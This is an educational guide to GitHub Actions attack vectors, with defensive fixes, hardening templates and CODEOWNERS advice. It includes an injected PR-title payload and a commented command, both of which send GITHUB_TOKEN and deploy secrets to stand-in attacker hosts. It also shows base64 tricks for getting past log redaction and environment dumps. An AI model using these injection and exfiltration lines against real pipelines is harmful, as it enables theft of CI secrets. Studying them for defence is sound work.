# GitHub Actions Attack Surface

> **EDUCATIONAL MATERIAL - For authorized security research only**

## Overview

GitHub Actions is one of the most widely used CI/CD platforms. Its deep integration with
GitHub's source control creates unique attack surfaces that are important to understand
for defensive purposes.

## 1. Architecture and Trust Model

### 1.1 Workflow Execution Model

```
GitHub Event (push, PR, schedule, etc.)
        |
        v
Workflow File (.github/workflows/*.yml)
        |
        v
Runner Selection (GitHub-hosted or self-hosted)
        |
        v
Job Execution (within a fresh VM or container)
        |
        v
Step Execution (run commands or actions)
```

### 1.2 Trust Boundaries

- **Workflow files**: Stored in the repository -- anyone with write access can modify them
- **Actions**: Third-party code executed in your CI environment
- **Secrets**: Encrypted values available to workflows
- **GITHUB_TOKEN**: Automatically provisioned with repository permissions
- **Runners**: Execution environments (shared for GitHub-hosted, dedicated for self-hosted)

## 2. Attack Vectors

### 2.1 Workflow Injection via Pull Request

```yaml
# EDUCATIONAL: Vulnerable workflow that processes PR data unsafely
name: PR Greeting
on:
  pull_request_target:  # Runs with write permissions even for fork PRs
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Greet PR author
        run: |
          # VULNERABLE: PR title is attacker-controlled
          # An attacker could set PR title to:
          # "Fix bug"; curl http://evil.example.com/steal?token=$GITHUB_TOKEN #
          echo "Thank you for your PR: ${{ github.event.pull_request.title }}"
```

**The fix:**
```yaml
      - name: Greet PR author (safe)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          # Safe: PR title is passed via environment variable, not interpolated
          echo "Thank you for your PR: ${PR_TITLE}"
```

### 2.2 Action Supply Chain Attacks

```yaml
# EDUCATIONAL: Vulnerable action references
steps:
  # VULNERABLE: Using a mutable tag reference
  - uses: actions/checkout@v3  # Tag can be moved to point to malicious code

  # SAFER: Using a full commit SHA
  - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab  # v3.5.2

  # VULNERABLE: Using a branch reference
  - uses: some-org/some-action@main  # Branch can be force-pushed

  # VULNERABLE: Third-party action from unknown publisher
  - uses: random-user/deploy-helper@v1  # Could contain malicious code
```

### 2.3 Secret Exfiltration

```yaml
# EDUCATIONAL: Techniques attackers use to extract secrets from CI

# Method 1: Direct exfiltration via network
# (GitHub redacts secrets in logs, but they can be sent over the network)
- name: Exfil via curl (educational)
  run: |
    # EDUCATIONAL ONLY - demonstrates the risk
    # curl -X POST https://attacker.example.com/collect \
    #   -d "token=${GITHUB_TOKEN}" \
    #   -d "secret=${DEPLOY_KEY}"

# Method 2: Base64 encoding to bypass log redaction
- name: Exfil via logs (educational)
  run: |
    # EDUCATIONAL ONLY - GitHub's log redaction can sometimes be bypassed
    # echo "SECRET_VALUE" | base64  # Encoded value isn't redacted
    # echo "S""E""C""R""E""T" | rev  # String manipulation bypasses

# Method 3: Environment variable dumping
- name: Env dump (educational)
  run: |
    # EDUCATIONAL: env command reveals all environment variables
    # including auto-injected secrets and tokens
    # env | sort  # Shows everything
    # printenv | base64  # Encoded dump
```

### 2.4 GITHUB_TOKEN Abuse

```yaml
# EDUCATIONAL: GITHUB_TOKEN permission escalation

# Default permissions (if not restricted) can include:
# - contents: write (push code)
# - pull-requests: write
# - issues: write
# - packages: write
# - actions: write (modify workflows!)

# An attacker who obtains GITHUB_TOKEN could:
# 1. Push malicious code to the repository
# 2. Create releases with backdoored artifacts
# 3. Modify workflow files to maintain persistence
# 4. Access private packages

# DEFENSE: Restrict token permissions
permissions:
  contents: read
  pull-requests: read
  # Only grant what's needed
```

### 2.5 Self-Hosted Runner Attacks

```yaml
# EDUCATIONAL: Self-hosted runners present additional risks

# Self-hosted runners:
# - May have persistent state between jobs
# - May have access to internal network
# - May have credentials cached from previous jobs
# - Are shared across workflows (potentially across repos)

# Attack scenario:
# 1. Attacker submits a PR that runs on a self-hosted runner
# 2. Malicious workflow installs a backdoor on the runner
# 3. Backdoor persists across subsequent job executions
# 4. Attacker gains access to all secrets used on that runner

# DEFENSE: Use ephemeral runners or container-based isolation
```

### 2.6 Environment Variable Injection

```yaml
# EDUCATIONAL: Injecting values through GITHUB_ENV and GITHUB_OUTPUT

steps:
  - name: Set environment variable
    run: |
      # GITHUB_ENV allows setting env vars for subsequent steps
      # If an attacker controls the value, they can inject additional vars
      echo "USER_INPUT=${{ github.event.comment.body }}" >> $GITHUB_ENV

      # VULNERABLE: If comment body contains a newline followed by:
      # DEPLOY_TOKEN=malicious_value
      # The attacker has injected a new environment variable

  - name: Use variables
    run: |
      # This step now has the injected DEPLOY_TOKEN
      echo "Deploying with token: $DEPLOY_TOKEN"
```

**The fix:**
```yaml
  - name: Set environment variable (safe)
    run: |
      # Use a delimiter to prevent injection
      delimiter=$(openssl rand -hex 16)
      echo "USER_INPUT<<${delimiter}" >> $GITHUB_ENV
      echo "${{ github.event.comment.body }}" >> $GITHUB_ENV
      echo "${delimiter}" >> $GITHUB_ENV
```

### 2.7 Cache Poisoning

```yaml
# EDUCATIONAL: GitHub Actions cache can be poisoned

# Normal caching:
- uses: actions/cache@v3
  with:
    path: vendor/bundle
    key: gems-${{ hashFiles('Gemfile.lock') }}

# Attack: If an attacker can trigger a workflow that populates the cache
# with malicious content, subsequent workflows will use the poisoned cache

# The cache is shared across branches in the same repository
# A PR from a fork can potentially poison the cache for the main branch
# (depending on cache scope configuration)

# DEFENSE:
# - Use immutable cache keys
# - Verify cache contents integrity
# - Restrict cache access scope
```

## 3. Workflow Poisoning Patterns

### 3.1 Modifying Workflow Files via PR

```yaml
# EDUCATIONAL: An attacker submits a PR that modifies .github/workflows/
# If the PR is merged without careful review, the attacker's workflow
# runs with full repository permissions

# Poisoned workflow example:
name: Build and Test
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install dependencies
        run: bundle install
      - name: Run tests
        run: bundle exec rspec
      # Attacker adds this step:
      - name: Post-build metrics  # Innocent-looking name
        run: |
          # Exfiltrate secrets
          # Educational simulation only
          echo "[EDUCATIONAL] This step could exfiltrate CI secrets"
```

### 3.2 Scheduled Workflow Backdoor

```yaml
# EDUCATIONAL: Adding a scheduled trigger for persistent access
name: Maintenance Tasks
on:
  schedule:
    - cron: '0 2 * * *'  # Runs daily at 2 AM
  workflow_dispatch: {}   # Also manually triggerable

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Cleanup old artifacts
        run: |
          echo "Cleaning up..."
          # Legitimate-looking task
      - name: Health check  # Actually a backdoor
        run: |
          # Educational: This runs daily with full repo access
          echo "[EDUCATIONAL] Persistent backdoor via scheduled workflow"
```

## 4. Composite Action Attacks

```yaml
# EDUCATIONAL: Malicious composite action
# .github/actions/setup-ruby/action.yml
name: 'Setup Ruby Environment'
description: 'Sets up Ruby with caching'
runs:
  using: 'composite'
  steps:
    - name: Setup Ruby
      shell: bash
      run: |
        # Legitimate setup
        ruby --version
        gem install bundler

    - name: Configure caching
      shell: bash
      run: |
        # Educational: Hidden malicious step mixed with legitimate config
        echo "[EDUCATIONAL] Could exfiltrate data during 'setup'"
```

## 5. Detection and Prevention

### 5.1 Workflow Security Checklist

```yaml
# Security-hardened workflow template
name: Secure Build

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# Restrict default permissions
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15  # Prevent long-running attacks

    # Restrict network access (if possible)
    # container:
    #   image: ruby:3.2
    #   options: --network none  # No network access during build

    steps:
      # Pin actions to exact SHA
      - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab

      # Verify Gemfile.lock integrity
      - name: Verify lockfile
        run: |
          bundle config set frozen true
          bundle install --deployment

      # Run security checks
      - name: Security audit
        run: |
          gem install bundler-audit
          bundle audit check --update

      - name: Static analysis
        run: |
          gem install brakeman
          brakeman --no-pager
```

### 5.2 Branch Protection Rules

- Require PR reviews for workflow file changes
- Use CODEOWNERS to require security team review for `.github/` changes
- Enable required status checks
- Prevent force pushes to protected branches

### 5.3 OpenSSF Scorecard

```bash
# Use OpenSSF Scorecard to assess repository security
# https://securityscorecards.dev/
# Checks for:
# - Pinned dependencies
# - Branch protection
# - Token permissions
# - Dangerous workflow patterns
# - And more...
```

## 6. CODEOWNERS for Workflow Protection

```
# .github/CODEOWNERS
# Require security team review for workflow changes
.github/workflows/ @security-team
.github/actions/   @security-team
Gemfile            @security-team
Gemfile.lock       @security-team
```

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides)
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner)
- [OpenSSF Scorecard](https://securityscorecards.dev/)
- [GitHub Actions Security Best Practices - GitGuardian](https://blog.gitguardian.com/github-actions-security-cheat-sheet/)
